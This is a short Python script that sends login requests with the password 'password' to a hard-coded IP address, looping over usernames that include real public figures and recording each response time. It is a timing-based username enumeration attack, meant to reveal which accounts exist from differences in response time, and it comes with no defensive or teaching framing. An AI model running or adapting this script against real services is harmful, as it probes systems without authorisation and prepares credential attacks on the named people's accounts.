import requests
import time

usernames = ["michelle.obama", "barack.obama", "hillary.clinton", "george.w.bush", "jane.doe", "sam.altman", "mira.murati", "olivier.lemer"]
url = "http://185.143.102.102:8080/login"

for username in usernames:
    start_time = time.time()
    response = requests.post(url, data={"username": username, "password": "password"})
    elapsed_time = (time.time() - start_time) * 1000  # Convert to milliseconds

    print(f"Username: {username}, Response Time: {elapsed_time:.2f} ms")